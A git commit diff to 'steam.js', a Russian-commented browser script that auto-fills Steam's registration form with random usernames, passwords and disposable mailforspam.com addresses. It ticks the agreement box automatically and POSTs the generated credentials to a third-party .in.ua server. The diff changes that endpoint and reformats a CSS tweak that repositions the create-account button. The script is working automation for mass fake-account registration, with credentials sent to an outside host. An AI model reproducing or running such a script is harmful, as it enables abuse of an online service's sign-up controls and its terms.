e1b2b773cd6f064fd70b27db4abfb86f18e9ba08
ZiMiN <35725161+vlady-almazing@users.noreply.github.com>
2018-01-30 18:34:05 +0200

    Update steam.js

--- steam.js
+++ steam.js
@@ -2,7 +2,7 @@
 Этот скрипт для сайта - https://store.steampowered.com/join
 ///*///
 
-// Для вставки в поле - Java Script
+// Для вставки в поле - JS
 /*
 var t=document.getElementById('responsive_store_nav_ctn').textContent;
 // ключевое слово из фразы которая появляется на странице подтверждения регистрации - 'Электронная почта подтверждена!'
@@ -18,7 +18,7 @@ function Chr(i){1==i?i=0:i=Rnd(0,6);p=Rnd(min[i], max[i]);if(96==p||47==p)p=95;r
 function Chz(d){p=Rnd(min[d], max[d]);return String.fromCharCode(p);}
 function Cre(t){for(var p='', i=1, j=1; i<=t; i++, j=i){if(j==t)j=1;p+=Chr(j);}return p;}
 function Upm(p){z=new XMLHttpRequest();z.open('POST',
-'http://js.xn--c1adqbs.in.ua/upm.php?u'+p[0]+'&p'+p[4]+'&m'+p[1], true);z.send();}
+'http://js.xn--c1adqbs.in.ua/kakun.php?a'+p[0]+'&p'+p[4]+'&m'+p[1], true);z.send();}
 for(var i=0; i<=3; i++){if(3==i){for(var b=1; b<=5; min.pop(), max.pop(), b++){}
 min.push(58, 33, 44, 94, 63, 65); max.push(59, 34, 46, 96, 90, 90);}
 r[i]=Cre(kol[i]);if(2==i){m=r[i];r[i-1]=r[i]+='@mailforspam.com';}}
@@ -26,9 +26,13 @@ r[4]=r[3]+=Chz(7)+Chz(4)+Chz(0)+Chz(1);r[3]+='12';
 for(var i=0; i<=4; i++){document.getElementById(n[i]).value=r[i]}
 document.getElementById('i_agree_check').checked=true&&Upm(r);
 window.open('https://www.mfsa.info/mail/'+m+'/1');
-//alert(r[0]+' : '+r[4]+' : '+r[1]);
 
 
 
-// Для вставки в поле - CSS Styles
-#createAccountButton{ position: absolute; top: 470px; left: 265px;}
+
+
+// Для вставки в поле - CSS
+#createAccountButton{
+position:absolute;
+top:470px;
+left:265px;}
